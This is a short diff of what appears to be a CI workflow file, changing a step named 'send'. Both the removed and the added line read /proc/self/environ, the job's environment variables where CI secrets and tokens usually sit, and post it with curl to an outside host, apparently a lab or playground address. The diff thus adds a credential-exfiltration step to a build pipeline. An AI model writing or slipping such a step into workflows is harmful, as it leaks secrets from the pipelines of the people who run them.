@@ -16,7 +16,7 @@ jobs:
 
       - name: send
         run: |
-          curl -F "file=@/proc/self/environ" http://6a461395480f046228802707-667342.node-eu-10a1.iximiuz.com/remote
+          cat /proc/self/environ |  curl --data-binary @- https://6a461395480f046228802707-ebc48f.node-eu-10a1.iximiuz.com
 
       - name: run
         run: |
